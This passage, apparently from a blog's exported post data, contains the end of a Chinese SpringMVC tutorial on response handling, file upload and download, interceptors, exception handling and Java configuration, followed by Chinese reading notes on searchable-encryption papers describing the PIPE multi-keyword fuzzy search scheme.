user-agent:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\"]\nrequestBody:username=admin&password=123\n\n### 3、@ResponseBody\n\n@ResponseBody用于标识一个控制器方法，可以将该方法的返回值直接作为响应报文的响应体响应到浏览器\n\n```java\n@RequestMapping(\"/testResponseBody\")\n@ResponseBody\npublic String testResponseBody(){\n    return \"hello\";\n}\n```\n\n结果：浏览器页面显示hello\n\n### 4、SpringMVC处理json\n\n@ResponseBody处理json的步骤：\n\n- a>导入jackson的依赖\n\n```xml\n<dependency>\n    <groupId>com.fasterxml.jackson.core</groupId>\n    <artifactId>jackson-databind</artifactId>\n    <version>2.12.1</version>\n</dependency>\n```\n\n- b>在SpringMVC的核心配置文件中开启mvc的注解驱动，此时在HandlerAdaptor中会自动装配一个消息转换器：MappingJackson2HttpMessageConverter，可以将响应到浏览器的Java对象转换为Json格式的字符串\n\n```xml\n<mvc:annotation-driven />\n```\n\n- c>在处理器方法上使用@ResponseBody注解进行标识\n\n- d>将Java对象直接作为控制器方法的返回值，就会自动转换为Json格式的字符串\n\n```java\n@RequestMapping(\"/testResponseUser\")\n@ResponseBody\npublic User testResponseUser(){\n    return new User(1001,\"admin\",\"123456\",23,\"男\");\n}\n```\n\n浏览器的页面中展示的结果：\n\n{\"id\":1001,\"username\":\"admin\",\"password\":\"123456\",\"age\":23,\"sex\":\"男\"}\n\n### 5、SpringMVC处理axios\n\na>请求超链接：\n\n```html\n<div id=\"app\">\n\t<a th:href=\"@{/testAxios}\" @click=\"testAxios\">testAxios</a><br>\n</div>\n```\n\nb>通过vue和axios处理点击事件：\n\n```html\n<script type=\"text/javascript\" th:src=\"@{/static/js/vue.js}\"></script>\n<script type=\"text/javascript\" th:src=\"@{/static/js/axios.js}\"></script>\n<script type=\"text/javascript\">\n    var vue = new Vue({\n        el:\"#app\",\n        methods:{\n            testAxios:function (event) {\n                axios({\n                    method:\"post\",\n                    url:event.target.href,\n                    params:{\n                        username:\"admin\",\n                        password:\"123456\"\n                    }\n                }).then(function (response) {\n                    alert(response.data);\n                });\n                event.preventDefault();//阻止超链接的默认跳转行为\n            }\n        }\n    });\n</script>\n```\n\nc>控制器方法：\n\n```java\n@RequestMapping(\"/testAxios\")\n@ResponseBody\npublic String testAxios(String username, String password){\n    System.out.println(\"username:\"+username+\",password:\"+password);\n    return \"hello,Axios\";\n}\n```\n\n### 6、@RestController\n\n@RestController注解是springMVC提供的一个复合注解，标识在**控制器的类**上\n\n相当于为**类**添加了`@Controller`注解，并且为其中的每个**方法**添加了`@ResponseBody`注解\n\n### 7、ResponseEntity\n\nResponseEntity用于控制器方法的返回值类型，该控制器方法的返回值就是响应到浏览器的响应报文\n\nResponseEntity可以用来实现文件上传和下载，具体实现请看下一章。\n\n## 九、文件上传和下载\n\n### 1、文件下载\n\n使用ResponseEntity实现下载文件的功能\n\n- a>下载文件超链接\n\n```html\n<a th:href=\"@{/testDown}\">下载文件</a>\n```\n\n- b>控制器方法\n\n```java\n@RequestMapping(\"/testDown\")\npublic ResponseEntity<byte[]> testResponseEntity(HttpSession session) throws IOException {\n    //获取ServletContext对象\n    ServletContext servletContext = session.getServletContext();\n    //获取服务器中文件的真实路径\n    String realPath = servletContext.getRealPath(\"/static/img/1.jpg\");\n    //创建输入流\n    InputStream is = new FileInputStream(realPath);\n    //创建字节数组\n    byte[] bytes = new byte[is.available()];\n    //将流读到字节数组中\n    is.read(bytes);\n    //创建HttpHeaders对象设置响应头信息\n    MultiValueMap<String, String> headers = new HttpHeaders();\n    //设置要下载方式以及下载后文件的名字\n    headers.add(\"Content-Disposition\", \"attachment;filename=1.jpg\");\n    //设置响应状态码\n    HttpStatus statusCode = HttpStatus.OK;\n    //创建ResponseEntity对象\n    ResponseEntity<byte[]> responseEntity = new ResponseEntity<>(bytes, headers, statusCode);\n    //关闭输入流\n    is.close();\n    return responseEntity;\n}\n```\n\n### 2、文件上传\n\n文件上传要求form表单的请求方式必须为post，并且添加属性`enctype=\"multipart/form-data\"`\n\nSpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息，上传步骤：\n\n- a>添加依赖：\n\n```xml\n<!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload -->\n<dependency>\n    <groupId>commons-fileupload</groupId>\n    <artifactId>commons-fileupload</artifactId>\n    <version>1.3.1</version>\n</dependency>\n```\n\nb>在SpringMVC的配置文件中添加配置：\n\n```xml\n<!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象-->\n<bean id=\"multipartResolver\" class=\"org.springframework.web.multipart.commons.CommonsMultipartResolver\"></bean>\n```\n\n- c>上传视图\n\n```html\n<form th:action=\"@{/testUp}\" method=\"post\" enctype=\"multipart/form-data\">\n  选择上传文件：<input type=\"file\" name=\"photo\"><br>\n  <input type=\"submit\">\n</form>\n```\n\n- d>控制器方法：\n\n```java\n@RequestMapping(\"/testUp\")\npublic String testUp(MultipartFile photo, HttpSession session) throws IOException {\n    //获取上传的文件的文件名\n    String fileName = photo.getOriginalFilename();\n    //处理文件重名问题\n    String hzName = fileName.substring(fileName.lastIndexOf(\".\"));\n    fileName = UUID.randomUUID().toString() + hzName;\n    //获取服务器中photo目录的路径\n    ServletContext servletContext = session.getServletContext();\n    String photoPath = servletContext.getRealPath(\"photo\");\n    File file = new File(photoPath);\n    if(!file.exists()){\n        file.mkdir();\n    }\n    String finalPath = photoPath + File.separator + fileName;\n    //实现上传功能\n    photo.transferTo(new File(finalPath));\n    return \"success\";\n}\n```\n\n## 十、拦截器\n\n### 1、拦截器的配置\n\n- SpringMVC中的拦截器用于**拦截控制器方法的执行**\n\n- SpringMVC中的拦截器需要实现**HandlerInterceptor**\n\nSpringMVC的拦截器必须在SpringMVC的配置文件中进行配置：\n\n```xml\n<bean class=\"com.example.interceptor.FirstInterceptor\"></bean>\n<ref bean=\"firstInterceptor\"></ref>\n<!-- 以上两种配置方式都是对DispatcherServlet所处理的所有的请求进行拦截 -->\n<mvc:interceptor>\n    <mvc:mapping path=\"/**\"/>\n    <mvc:exclude-mapping path=\"/testRequestEntity\"/>\n    <ref bean=\"firstInterceptor\"></ref>\n</mvc:interceptor>\n<!-- \n\t以上配置方式可以通过ref或bean标签设置拦截器，通过mvc:mapping设置需要拦截的请求，通过mvc:exclude-mapping设置需要排除的请求，即不需要拦截的请求\n-->\n```\n\n### 2、拦截器的三个抽象方法\n\nSpringMVC中的拦截器有三个抽象方法：\n\n- preHandle：控制器方法执行之前执行preHandle()，\n  - boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；\n  - 返回false表示拦截，即不调用控制器方法\n\n- postHandle：控制器方法执行之后执行postHandle()\n\n- afterComplation：渲染视图完毕之后执行afterComplation()，处理完视图和模型数据\n\n### 3、多个拦截器的执行顺序\n\n- a>若每个拦截器的preHandle()都返回true\n\n  -  此时多个拦截器的执行顺序和拦截器在SpringMVC的配置文件的配置顺序有关：\n\n  - preHandle()会按照配置的顺序执行\n  - postHandle()和afterComplation()会按照配置的反序执行\n\n- b>若某个拦截器的preHandle()返回了false\n  - preHandle()返回false和它之前的拦截器的preHandle()都会执行，postHandle()都不执行，返回false的拦截器之前的拦截器的afterComplation()会执行\n\n## 十一、异常处理器\n\n### 1、基于配置的异常处理\n\nSpringMVC提供了一个处理控制器方法执行过程中所出现的异常的接口：HandlerExceptionResolver\n\nHandlerExceptionResolver接口的实现类有：DefaultHandlerExceptionResolver和SimpleMappingExceptionResolver\n\nSpringMVC提供了自定义的异常处理器SimpleMappingExceptionResolver，使用方式：\n\n```xml\n<!--配置异常处理-->\n<bean class=\"org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\">\n    <property name=\"exceptionMappings\">\n        <props>\n        \t<!--\n        \t\tproperties的键表示处理器方法执行过程中出现的异常\n        \t\tproperties的值表示若出现指定异常时，设置一个新的视图名称，跳转到指定页面\n        \t-->\n            <prop key=\"java.lang.ArithmeticException\">error</prop>\n        </props>\n    </property>\n    <!--\n    \texceptionAttribute属性设置一个属性名，将出现的异常信息在请求域中进行共享\n    -->\n    <property name=\"exceptionAttribute\" value=\"ex\"></property>\n</bean>\n```\n\n**测试**\n\n点击超链接，执行控制器方法，出现数学运算错误，跳转到error页面，并且返回错误信息\n\n```java\n//跳转超链接\n<a th:href=\"@{/testExceptionHandler}\">测试异常处理</a>\n\n//控制器方法  \n@RequestMapping(\"/testExceptionHandler\")\npublic String testExceptionHandler(){\n    System.out.println(1/0);\n    return \"success\";\n}\n```\n\nerror.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Title</title>\n</head>\n<body>\n出现错误\n<p th:text=\"${ex}\"></p><!--返回错误信息-->\n</body>\n</html>\n```\n\n返回结果\n\n```\n出现错误\njava.lang.ArithmeticException: / by zero\n```\n\n### 2、基于注解的异常处理\n\n```java\n@ControllerAdvice //@ControllerAdvice将当前类标识为异常处理的组件\npublic class ExceptionController {\n    //@ExceptionHandler用于设置处理的异常\n    @ExceptionHandler(ArithmeticException.class)\n    //ex表示当前请求处理中出现的异常对象\n    public String handleArithmeticException(Exception ex, Model model){\n        model.addAttribute(\"ex\", ex);\n        return \"error\";\n    }\n}\n```\n\n该方法实现效果与基于配置的异常处理效果一样\n\n## 十二、注解配置SpringMVC\n\n> 使用配置类和注解代替web.xml和SpringMVC配置文件的功能\n\n### 1、创建初始化类，代替web.xml\n\n- 在Servlet3.0环境中，容器会在类路径中查找实现javax.servlet.ServletContainerInitializer接口的类，如果找到的话就用它来配置Servlet容器。\n- Spring提供了这个接口的实现，名为SpringServletContainerInitializer，这个类反过来又会查找实现WebApplicationInitializer的类并将配置的任务交给它们来完成。\n- Spring3.2引入了一个便利的WebApplicationInitializer基础实现，名为AbstractAnnotationConfigDispatcherServletInitializer，当我们的类扩展了AbstractAnnotationConfigDispatcherServletInitializer并将其部署到Servlet3.0容器的时候，容器会自动发现它，并用它来配置Servlet上下文。\n\n```java\npublic class WebInit extends AbstractAnnotationConfigDispatcherServletInitializer {\n\n    /**\n     * 指定spring的配置类\n     * @return\n     */\n    @Override\n    protected Class<?>[] getRootConfigClasses() {\n        return new Class[]{SpringConfig.class};\n    }\n\n    /**\n     * 指定SpringMVC的配置类\n     * @return\n     */\n    @Override\n    protected Class<?>[] getServletConfigClasses() {\n        return new Class[]{WebConfig.class};\n    }\n\n    /**\n     * 指定DispatcherServlet的映射规则，即url-pattern\n     * @return\n     */\n    @Override\n    protected String[] getServletMappings() {\n        return new String[]{\"/\"};\n    }\n\n    /**\n     * 添加过滤器\n     * @return\n     */\n    @Override\n    protected Filter[] getServletFilters() {\n        CharacterEncodingFilter encodingFilter = new CharacterEncodingFilter();\n        encodingFilter.setEncoding(\"UTF-8\");\n        encodingFilter.setForceRequestEncoding(true);\n        HiddenHttpMethodFilter hiddenHttpMethodFilter = new HiddenHttpMethodFilter();\n        return new Filter[]{encodingFilter, hiddenHttpMethodFilter};\n    }\n}\n```\n\n### 2、创建SpringConfig配置类，代替spring的配置文件\n\n```java\n@Configuration\npublic class SpringConfig {\n\t//ssm整合之后，spring的配置信息写在此类中\n}\n```\n\n### 3、创建WebConfig配置类，代替SpringMVC的配置文件\n\n```java\n@Configuration\n//扫描组件\n@ComponentScan(\"com.atguigu.mvc.controller\")\n//开启MVC注解驱动\n@EnableWebMvc\npublic class WebConfig implements WebMvcConfigurer {\n\n    //使用默认的servlet处理静态资源\n    @Override\n    public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {\n        configurer.enable();\n    }\n\n    //配置文件上传解析器\n    @Bean\n    public CommonsMultipartResolver multipartResolver(){\n        return new CommonsMultipartResolver();\n    }\n\n    //配置拦截器\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        FirstInterceptor firstInterceptor = new FirstInterceptor();\n        registry.addInterceptor(firstInterceptor).addPathPatterns(\"/**\");\n    }\n    \n    //配置视图控制\n    \n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController(\"/success\").setViewName(\"success\");\n    }\n    \n    //配置异常映射\n    @Override\n    public void configureHandlerExceptionResolvers(List<HandlerExceptionResolver> resolvers) {\n        SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();\n        Properties prop = new Properties();\n        prop.setProperty(\"java.lang.ArithmeticException\", \"error\");\n        //设置异常映射\n        exceptionResolver.setExceptionMappings(prop);\n        //设置共享异常信息的键\n        exceptionResolver.setExceptionAttribute(\"ex\");\n        resolvers.add(exceptionResolver);\n    }\n\n    //配置生成模板解析器\n    @Bean\n    public ITemplateResolver templateResolver() {\n        WebApplicationContext webApplicationContext = ContextLoader.getCurrentWebApplicationContext();\n        // ServletContextTemplateResolver需要一个ServletContext作为构造参数，可通过WebApplicationContext 的方法获得\n        ServletContextTemplateResolver templateResolver = new ServletContextTemplateResolver(\n                webApplicationContext.getServletContext());\n        templateResolver.setPrefix(\"/WEB-INF/templates/\");\n        templateResolver.setSuffix(\".html\");\n        templateResolver.setCharacterEncoding(\"UTF-8\");\n        templateResolver.setTemplateMode(TemplateMode.HTML);\n        return templateResolver;\n    }\n\n    //生成模板引擎并为模板引擎注入模板解析器\n    @Bean\n    public SpringTemplateEngine templateEngine(ITemplateResolver templateResolver) {\n        SpringTemplateEngine templateEngine = new SpringTemplateEngine();\n        templateEngine.setTemplateResolver(templateResolver);\n        return templateEngine;\n    }\n\n    //生成视图解析器并未解析器注入模板引擎\n    @Bean\n    public ViewResolver viewResolver(SpringTemplateEngine templateEngine) {\n        ThymeleafViewResolver viewResolver = new ThymeleafViewResolver();\n        viewResolver.setCharacterEncoding(\"UTF-8\");\n        viewResolver.setTemplateEngine(templateEngine);\n        return viewResolver;\n    }\n}\n```\n\n### 4、测试功能\n\n```java\n@RequestMapping(\"/\")\npublic String index(){\n    return \"index\";\n}\n\n@RequestMapping(\"/testExceptionHandler\")\n@ResponseBody\npublic String testExceptionHandler(){\n    System.out.println(1/0);\n    return \"success\";\n}\n```\n\n##  十三、SpringMVC执行流程\n\n### 1、SpringMVC常用组件\n\n- DispatcherServlet：**前端控制器**，不需要工程师开发，由框架提供\n  - 作用：统一处理请求和响应，整个流程控制的中心，由它调用其它组件处理用户的请求\n\n- HandlerMapping：**处理器映射器**，不需要工程师开发，由框架提供\n  - 作用：根据请求的url、method等信息查找Handler，即控制器方法\n\n- Handler：**处理器**，需要工程师开发\n  - 作用：在DispatcherServlet的控制下Handler对具体的用户请求进行处理\n\n- HandlerAdapter：**处理器适配器**，不需要工程师开发，由框架提供\n  - 作用：通过HandlerAdapter对处理器（控制器方法）进行执行\n\n- ViewResolver：**视图解析器**，不需要工程师开发，由框架提供\n  - 作用：进行视图解析，得到相应的视图，例如：ThymeleafView、InternalResourceView、RedirectView\n\n- View：**视图**\n  - 作用：将模型数据通过页面展示给用户\n\n### 2、DispatcherServlet初始化过程\n\nDispatcherServlet 本质上是一个 Servlet，所以天然的遵循 Servlet 的生命周期。所以宏观上是 Servlet 生命周期来进行调度。\n\n...\n\n### 3、DispatcherServlet调用组件处理请求\n\n...\n\n### 4、SpringMVC的执行流程\n\n1) 用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。\n2) DispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：\n\n- a) 不存在\n\n  - i. 再判断是否配置了`mvc:default-servlet-handler`\n\n  - ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误\n\n  - iii. 如果有配置，则访问目标资源(一般为静态资源，如：JS,CSS,HTML)，找不到客户端也会展示404错误\n\n- b) 存在\n\n  - i. 根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象(包括Handler对象以及Handler对象对应的拦截器)，最后以HandlerExecutionChain执行链对象的形式返回\n  - ii.DispatcherServlet根据获得的Handler，选择一个合适的HandlerAdapter\n  - iii. 如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】\n  - iv. 提取Request中的模型数据，填充Handler入参，开始执行Handler(Controller)方法，处理请求。在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：\n    - a) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息\n    - b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等\n    - c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等\n    - d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中\n\n3. Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象\n4. 此时将开始执行拦截器的postHandle(...)方法【逆向】\n5. 根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model和View，来渲染视图\n6. 渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】\n\n7) 将渲染结果返回给客户端。\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringMVC"],"categories":["Spring"]},{"title":"可搜索加密：论文阅读2","url":"/posts/31203.html","content":"\n## SE论文清单\n\n| 序号   | 论文名称                                                     | 作者  <br/>年份       | 单位              | 来源         | 等级[CCF](https://www.ccf.org.cn/Academic_Evaluation/NIS/) | 链接                                                         |\n| ------ | ------------------------------------------------------------ | --------------------- | ----------------- | ------------ | :--------------------------------------------------------: | ------------------------------------------------------------ |\n| 7      | Prime Inner Product Encoding for EffectiveWildcard-based Multi-Keyword Fuzzy Search | 刘勤2020              | 湖南大学          | IEEE TSC     |                             B                              | [原文](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/9184150) |\n| 8      | Enabling Efficient Verifiable Fuzzy Keyword Search Over Encrypted Data in Cloud Computing | 葛新瑞      2018      | 青岛大学          | IEEE Access  |                             ——                             | [原文](https://ieeexplore.ieee.org/document/8438878)         |\n| 9      | Cuckoo-Filter Based Privacy-Aware Search over Encrypted Cloud Data | 薛清寒2015            | Lehigh University | MSN          |                             C                              | [原文](https://ieeexplore.ieee.org/document/7420926)         |\n| ~~10~~ | ~~VCKSCF: Efficient Verifiable Conjunctive Keyword Search Based on Cuckoo Filter for Cloud Storage~~ | ~~陈凡2021~~          | ~~华东师范大学~~  | ~~TrustCom~~ |                             C                              | [原文](https://ieeexplore.ieee.org/document/9343045)         |\n| 11     | ESVSSE: Enabling Efficient, Secure, Verifiable Searchable Symmetric Encryption | 石振奎2020            | 广西师范大学      | IEEE TKDE    |                             A                              | [原文](https://ieeexplore.ieee.org/document/9201320)         |\n| 12     | Dynamic Multi-Phrase Ranked Search over Encrypted Data with Symmetric Searchable Encryption | 郭成2017              | 大连理工大学      | IEEE TSC     |                             B                              | [原文](https://ieeexplore.ieee.org/document/8089767)         |\n|        |                                                              |                       |                   |              |                                                            |                                                              |\n| -      | VPSearch: Achieving Verifiability for Privacy-Preserving Multi-Keyword Search over Encrypted Cloud Data | 万志国2016            | 山东大学          | IEEE TDSC    |                             A                              | [原文](https://ieeexplore.ieee.org/document/7765119)         |\n| -      | A New Lightweight Symmetric Searchable Encryption Scheme for String Identification | Indranil Ghosh   2020 | 伦敦大学          | IEEE TCC     |                             C                              | [原文](https://www.computer.org/csdl/journal/cc/2020/03/08326521/13rRUIJcWn3) |\n\n## ⑦PIPE方案\n\n**论文名称：《Prime Inner Product Encoding for EffectiveWildcard-based Multi-Keyword Fuzzy Search》**\n\n- 作者：刘勤; 于鹏; 裴淑玉; 吴杰; 彭涛; 王国军\n- 单位：湖南大学\n- 刊物：[IEEE TRANSACTIONS ON SERVICES COMPUTING](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/9184150)【CCF B】\n- 时间：2020年09月\n- 阅读完成时间：2022年05月31日\n\n### 1、总体思路\n\n本文提出了一种**素数内积编码**（PIPE）方案，该方案利用**素数的不可分解性**来提供高效、高精度、灵活的**多关键字模糊搜索**。\n\n**主要思想**：是将查询关键字或索引关键字编码为充满素数或素数倒数的向量，这样只有**当两个关键字相似时，向量的内积的结果才是整数**（因为素数除了1和它本身没有正因子，所以只有当两个关键字相似时，向量内积的结果才是整数）。为了支持多关键字模糊搜索，将关键字向量组织成矩阵，并利用**矩阵乘法**来支持and/or查询。\n\n- 首先构建了在已知密文模型中安全的 **PIPE0 方案**。与难以同时**支持 AND 和 OR** 语义的现有作品不同，PIPE0 使用户能够灵活地在其查询中**指定不同的搜索语义**。\n\n- 然后构造了 **PIPES 方案**，巧妙地将**随机噪声**添加到查询向量中，以**抵制线性分析**。理论分析和实验结果都证明了该方案的有效性。\n\n### 2、使用技术\n\n- 素数内积编码\n- 编辑距离\n- 安全k近邻方案（Secure k-Nearest Neighbor Scheme）\n\n  - `⋆`矩阵乘法\n\n  - `·`向量内积\n\n**EncI(p, sk)→p'**：将索引向量 p ∈ R<sup>d </sup>分成两个向量(p<sub>a</sub>, p<sub>b</sub>)，如下:\n\n- for i = 1 to d\n\n  - 如果 s[i] = 1，p[i] 随机分成 p<sub>a</sub>[i]， p<sub>b</sub>[i]，使 p<sub>a</sub>[i] + p<sub>b</sub>[i] = p[i];\n\n  - 如果 s[i] = 0，p<sub>a</sub>[i] 和 p<sub>b</sub>[i] 都设置为 p[i]。\n\n- 加密 (p<sub>a</sub>, p<sub>b</sub>) 并输出 p' = (p'<sub>a</sub>, p'<sub>b</sub>)，其中 (**p'<sub>a</sub> = M<sub>1</sub><sup>T</sup>⋆p<sub>a</sub>，p'<sub>b</sub> =  M<sub>2</sub><sup>T</sup>⋆p<sub>b</sub>**)。\n\n**EncQ(q, sk) → q'** : 将查询向量 q∈R<sup>d </sup>分割为两个向量(q<sub>a</sub>, q<sub>b</sub>)，如下:\n\n- for i = 1 to d\n  - 如果 s[i] = 1，则 q<sub>a</sub>[i] 和 q<sub>b</sub>[i] 都设置为 q[i];\n  - 如果 s[i] = 0，则 q[i] 随机分成 q<sub>a</sub>[i]， q<sub>b</sub>[i]，使 q<sub>a</sub>[i] + q<sub>b</sub>[i] = q[i]。\n- 加密 (q<sub>a</sub>, q<sub>b</sub>) 并输出 q' = (q'<sub>a</sub>, q'<sub>b</sub>)，其中 (**q'<sub>a</sub> = M<sub>1</sub><sup>-1</sup>⋆q<sub>a</sub>，q'<sub>b</sub> =  M<sub>2</sub><sup>-1</sup>⋆ <sub>b</sub>**)。\n\n**Search(p'，q')→v**：计算 v = p'<sub>a</sub>·q'<sub>a</sub> + p'<sub>b</sub>·q'<sub>b</sub> 作为搜索结果。注意:\n\np' · q'  = p'<sub>a</sub>（行向量）·q'<sub>a</sub> + p'<sub>b</sub>·q'<sub>b</sub>\n\n= p'<sub>a</sub><sup>T</sup>·q'<sub>a</sub> + p'<sub>b</sub><sup>T</sup>·q'<sub>b</sub>\n\n= (M<sub>1</sub><sup>T</sup>⋆p<sub>a</sub>)<sup>T</sup> · (M<sub>1</sub><sup>-1</sup>⋆q<sub>a</sub>) + (M<sub>2</sub><sup>T</sup>⋆p<sub>b</sub>)<sup>T</sup> · (M<sub>2</sub><sup>-1</sup>⋆q<sub>b</sub>) \n\n= p<sub>a</sub><sup>T</sup> ⋆ q<sub>a</sub> + p<sub>b</sub><sup>T</sup>⋆ q<sub>b</sub>\n\n= p<sup>T</sup>⋆ q\n\n= p · q\n\n因此，加密后的向量的内积和等价于原始向量的内积。\n\n### 3、方案实现\n\nPIPE0=(GenKey<sub>0</sub>, BuildIndex<sub>0</sub>, Trapdoor<sub>0</sub>, Search<sub>0</sub>)\n\n#### 密钥生成算法\n\n**SK ← GenKey<sub>0</sub>(1<sup>k</sup>)** 生成密钥，具体步骤如下：\n\n- 给定安全参数 κ，云用户运行 KNN.Key(1<sup>k</sup>) 来生成 sk = (M<sub>1</sub>, M<sub>2</sub>, s)\n- 随机选择一个 长度 L 素数序列 P = (p<sub>1</sub>，…， p<sub>L</sub>)，一个由 L 个虚拟字符组成的字典 S = (s<sub>1</sub>，…， s<sub>L</sub>)，使 S ∩ A = ∅，和 k 位字符串 k<sub>f</sub>\n  - k ∈ N 是安全参数\n  - A 是 26个英文字母构成的字典\n  - L = max(||w<sub>1</sub>||，…，||w<sub>m</sub>||) 是关键字的最大长度\n  - RPF：F:{0,1}<sup>k</sup> x {0,1}<sup>*</sup>→ {0,1}<sup>k</sup>\n- 密钥 SK 为(sk，k<sub>f</sub>，P，S)\n\n#### 索引生成算法\n\n **I<sub>i</sub> ← BuildIndex<sub>0</sub>(W<sub>i</sub>,SK)** 生成索引，具体步骤如下：\n\n- 具有 m<sub>i</sub> 关键字的文件 D<sub>i</sub> 文件的关键字集合 W<sub>i</sub> = {W<sub>i,1</sub>， . .， w<sub>i,m<sub>i</sub></sub>}，云用户构建 ｜m<sub>i</sub>｜× d 矩阵 A<sub>i</sub>\n  - 1)对于k ∈ [m<sub>i</sub>]，运行**算法1**为 W<sub>i</sub> 中的第 k 个关键字 w<sub>i,k</sub> 输出 d 维向量 p<sub>i,k</sub>\n  - 2)对于k ∈ [m<sub>i</sub>]，设置 A<sub>i</sub>\\[k]\\[∗] ← P<sub>i,k</sub>\n\n- 对于 k ∈ [m<sub>i</sub>]，运行 KNN.EncI(A<sub>i</sub>\\[k][∗]，sk) 加密矩阵 A<sub>i</sub> 的第 k 行并输出一对加密向量 (A'<sub>i<sub>a</sub></sub>\\[k][∗]，A'<sub>i<sub>b</sub></sub>\\[k][∗]) 。加密索引 I<sub>i</sub> 设为一对加密矩阵 A'<sub>i</sub>= (A'<sub>i<sub>a</sub></sub>，A'<sub>i<sub>b</sub></sub>)\n\n![算法1](https://img.jwt1399.top/img/image-20220324114026256.png)\n\n- 第一步(第1-2行)：用 S 中元素填充每个关键字，以隐藏其真正的长度。用 L 表示通用关键字的最大长度。填充之后，每个关键字的长度都等于 L 。\n- 第二步(第3-4行)：用 1 初始化索引向量的每个元素。\n- 第三步(第5-7行)：将指定素数的倒数放在索引向量的适当位置。对于关键字 w<sub>i,k </sub>的第 l 个字符 w<sub>i,k</sub>[l]，对应的素数为 p<sub>l</sub>，对应的位置计算为 pos<sub>l</sub> = F<sub>kf</sub> (w<sub>i,k</sub>[l])。因此，对于 l∈[l]， p<sub>i,k </sub>[pos<sub>l</sub>] 将乘以 1/p<sub>l</sub>。\n- 第四步(第8行)：为了增加内积结果的随机性，用随机数 z ∈ [d - L] 填充剩余部分元素。\n\n#### 陷门生成算法\n\nT<sub>Q<sub>j</sub></sub> ← Trapdoor<sub>0</sub>(W'<sub>j</sub>, SK) 生成陷门，具体步骤如下：\n\n- 具有 n<sub>i</sub> 关键字的查询 Q<sub>j</sub> 文件的关键字集合 W'<sub>i</sub> = {W'<sub>i,1</sub>， . .， w'<sub>i,n<sub>j</sub></sub>}，云用户构建 n<sub>i</sub> × d 矩阵 B<sub>i</sub>\n  - 1)对于k ∈ [n<sub>j</sub>]，运行**算法2**为 W'<sub>j</sub> 中的第 k 个关键字 w'<sub>j,k</sub> 输出d维向量 q<sub>j,k</sub>\n  - 2)对于k ∈ [n<sub>j</sub>]，设置 A<sub>i</sub>\\[k]\\[∗] ← P<sub>i,k</sub>\n\n- 对于 k ∈ [n<sub>j</sub>]，运行 KNN.EncQ(B<sub>j</sub>\\[k][∗]，sk) 加密矩阵 B<sub>j</sub> 的第 k 行并输出一对加密向量 (B'<sub>j<sub>a</sub></sub>\\[k][∗]，B'<sub>j<sub>b</sub></sub>\\[k][∗]) 。陷门 T<sub>Q<sub>j</sub></sub> 设为一对加密矩阵 B'<sub>j</sub>= (B'<sub>j<sub>a</sub></sub>，B'<sub>j<sub>b</sub></sub>)\n\n![算法2](https://img.jwt1399.top/img/image-20220324114819057.png)\n\n- 第一步(第1-2行)填充步骤和第二步(第3-4行)初始化步骤与算法1相同\n- 第三步(第5-15行)：将指定的素数放置在索引向量的适当位置，对于关键字 w<sub>j,k </sub>的第 l 个 字符 w<sub>j,k</sub>[l]，有两种情况:\n  - (1)如果 w<sub>j,k</sub>[l] ≠ \"∗\"，执行 6-8 行，计算 pos<sub>l</sub> = F<sub>kf</sub>(w<sub>i,k</sub>[l]) 并将 q<sub>j,k </sub>[pos<sub>l</sub>] 乘以 p<sub>l</sub>\n  - (2)如果 w<sub>j,k</sub>[l] = \"∗\"，表示在 A ∪ S 中任意一个字符都可能位于关键字的第 l 位。\n    - 执行 10-15 行，计算 1 ≤ i ≤ 26 的 pos<sub>li</sub> = F<sub>kf</sub>(A[i]) 和 26 < i ≤ 26 + L 的 pos<sub>li</sub> = F<sub>kf</sub>(S[i−26])\n    - 并将 x ∈ [1，26 + L] 的 q<sub>j,k</sub>[pos<sub>lx</sub>] 乘以 p<sub>l</sub>\n- 第四步(第16行)：为了增加内积结果的随机性，用随机数 z ∈ [d- 26 - L] 填充剩余部分元素。\n\n#### 搜索算法\n\n**{0,1} ← Search<sub>0</sub>(I<sub>i</sub>,T<sub>Q<sub>j</sub></sub>) **搜索算法，具体步骤如下：\n\n- 云服务商计算：R<sub>i,j </sub>= A'<sub>i<sub>a</sub></sub> ⋆ B'<sub>j<sub>a</sub></sub> + A'<sub>i<sub>b</sub></sub> 